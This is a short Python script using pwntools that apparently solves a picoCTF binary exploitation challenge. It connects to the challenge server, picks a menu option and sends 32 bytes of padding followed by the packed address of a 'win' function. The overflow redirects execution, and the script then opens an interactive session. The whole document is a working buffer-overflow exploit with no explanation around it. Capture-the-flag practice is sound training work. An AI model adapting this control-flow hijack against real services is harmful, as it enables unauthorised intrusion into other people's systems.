from pwn import *

context(arch='amd64', os='linux')

padding = b'A' * 32
win_addr = p64(0x00000000004011a0)

r = remote('mimas.picoctf.net', 53045)
r.recvuntil(b'Enter your choice: ')
r.sendline(b'2')
r.sendline(padding + win_addr)
r.recvline()
r.sendline(b'4')
r.recvline()
r.interactive()

